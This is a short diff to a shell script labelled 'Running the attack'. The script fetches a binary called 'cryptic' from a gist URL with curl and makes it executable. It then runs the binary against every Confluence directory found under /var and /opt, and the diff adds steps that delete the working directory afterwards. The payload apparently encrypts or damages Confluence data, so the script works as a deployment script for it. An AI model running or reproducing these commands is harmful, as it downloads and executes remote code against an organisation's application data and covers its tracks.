@@ -13,7 +13,11 @@
 # pyinstaller cryptic.py --onefile
 
 # Running the attack
+mkdir /tmp/cryptic
+cd /tmp/cryptic
 curl -L https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/003d4ecfcb9a0b468c02af72f495e90b6a2fd01e/cryptic > cryptic
 chmod +x cryptic
 # Find with name confluence in /var and /opt
 ./cryptic $(find /var -name "confluence" -print) $(find /opt -name "confluence" -print)
+cd /
+rm -rf /tmp/cryptic
